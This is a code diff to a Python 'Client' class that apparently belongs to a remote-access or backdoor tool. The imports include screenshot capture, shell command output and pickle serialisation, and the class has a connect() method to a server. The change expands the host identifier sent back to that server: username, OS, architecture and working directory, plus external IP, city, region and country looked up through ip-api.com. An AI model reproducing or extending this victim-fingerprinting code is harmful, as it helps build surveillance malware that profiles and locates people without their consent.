@@ -9,6 +9,7 @@ from getpass import getuser
 from datetime import datetime
 from pyscreenshot import grab
 from pathlib import Path
+from json import loads as jloads
 from pickle import loads, dumps
 from subprocess import getoutput
 from requests import get, packages
@@ -172,12 +173,15 @@ class Client(object):
 
     # returns some basic data about client
     def identifier(self):
-        try:
-            eAddress = get('https://api.ipify.org?format=text').content.decode()
-        except Exception:
-            eAddress = ''
+        identifier = {"name": getuser(), "SO": uname().sysname, "arch": uname().machine, "currentDirectory": getcwd()}
         
-        return dumps({"name": getuser(), "SO": uname().sysname, "arch": uname().machine, "externalAddress": eAddress, "currentDirectory": getcwd()})
+        try:
+            info = jloads(get('http://ip-api.com/json/').content) # locality
+            identifier.update({"externalAddress": info['query'], "city": info['city'], "country": info['country'], "region": info['region']})
+        except Exception:
+            pass
+        
+        return dumps(identifier)
 
     # trying to connect to the server
     def connect(self):
